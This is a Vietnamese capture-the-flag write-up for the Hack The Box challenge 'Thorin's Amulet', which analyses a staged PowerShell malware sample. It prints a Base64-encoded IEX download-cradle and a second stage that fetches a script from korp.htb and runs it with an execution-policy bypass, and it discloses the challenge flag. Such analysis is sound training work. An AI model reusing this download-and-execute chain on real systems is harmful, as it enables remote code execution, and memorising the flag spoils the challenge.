# Thorin’s Amulet 

### Details:
Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened?** Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.**

### Solution:
Ví dụ Docker instance: `94.237.51.163:57889`

Challenge cho chúng ta file `.ps1` :
```ps1
# artifact.ps1
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

Đoạn code có 1 đoạn đang bị encode Base64: `SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik=`, ta tiến hành decode nó:

```bash
# bash
> echo SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik= | base64 -d
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

Đoạn code sẽ tiến hành download từ link `http://korp.htb/update` . Note của đề bài cho ta biết `korp.htb` sẽ mapping tới docker spawn của mình nên mình sẽ sửa link thành `http://94.237.51.163:57889/update`
Ta tiến hành tải file từ link và nhận được 1 file `update.ps1`:

```ps1
# update.ps1
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

Chương trình sẽ request tới `http://korp.htb/a541a` với header đã cung cấp để tải và thực thi file có tên là `a541a.ps1`
Ta tiến hành sửa code `.ps1` để thực hiện mỗi tải file để phân tích:
```ps1
Invoke-WebRequest -Uri "http://94.237.51.163:57889/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
```

Ta được tải được file có nội dung:
```ps1

# a541a.ps1
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```

Code sẽ decode string từ hex value, ta tiến thành thực hiện nó và có flag:

`HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}`

